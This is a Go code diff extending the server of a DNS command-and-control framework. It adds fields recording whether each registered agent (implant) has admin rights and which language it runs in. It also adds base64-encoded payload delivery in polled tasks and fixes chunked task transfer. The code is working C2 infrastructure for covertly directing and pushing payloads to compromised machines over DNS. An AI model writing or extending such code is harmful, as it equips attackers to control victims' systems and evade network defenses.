@@ -2,6 +2,7 @@ package server
 
 import (
 	"encoding/base32"
+	"encoding/base64"
 	"encoding/json"
 	"fmt"
 	"net"
@@ -255,12 +256,18 @@ func (dc *dnsC2) handleReg(agentID, b32Chunk string, seq, total int) string {
 		OS       string `json:"os"`
 		PID      int    `json:"pid"`
 		AESKey   string `json:"aes_key"`
+		IsAdmin  bool   `json:"is_admin"`
+		Language string `json:"language"`
 	}
 	if err := json.Unmarshal(data, &info); err != nil {
 		return "err:json"
 	}
 
 	aesKey, _ := b32.DecodeString(strings.ToUpper(info.AESKey))
+	language := info.Language
+	if language == "" {
+		language = "go"
+	}
 	a := &Agent{
 		ID:        agentID,
 		Hostname:  info.Hostname,
@@ -271,6 +278,8 @@ func (dc *dnsC2) handleReg(agentID, b32Chunk string, seq, total int) string {
 		SleepSec:  60,
 		JitterPct: 20,
 		Transport: "dns",
+		IsAdmin:   info.IsAdmin,
+		Language:  language,
 		Active:    true,
 	}
 	if err := dc.s.db.RegisterAgent(a); err != nil {
@@ -300,10 +309,14 @@ func (dc *dnsC2) handlePoll(agentID string) string {
 
 	task := tasks[0]
 	tw := struct {
-		ID   int64  `json:"id"`
-		Type string `json:"type"`
-		Args string `json:"args"`
+		ID      int64  `json:"id"`
+		Type    string `json:"type"`
+		Args    string `json:"args"`
+		Payload string `json:"payload,omitempty"`
 	}{ID: task.ID, Type: task.Type, Args: task.Args}
+	if len(task.Payload) > 0 {
+		tw.Payload = base64.StdEncoding.EncodeToString(task.Payload)
+	}
 	data, _ := json.Marshal(tw)
 
 	// encode as b32
@@ -316,7 +329,7 @@ func (dc *dnsC2) handlePoll(agentID string) string {
 	}
 	// store remaining chunks for chunked fetch
 	dc.mu.Lock()
-	dc.taskOut[agentID] = chunks[1:]
+	dc.taskOut[agentID] = chunks
 	dc.mu.Unlock()
 	return fmt.Sprintf("more:%d", len(chunks))
 }
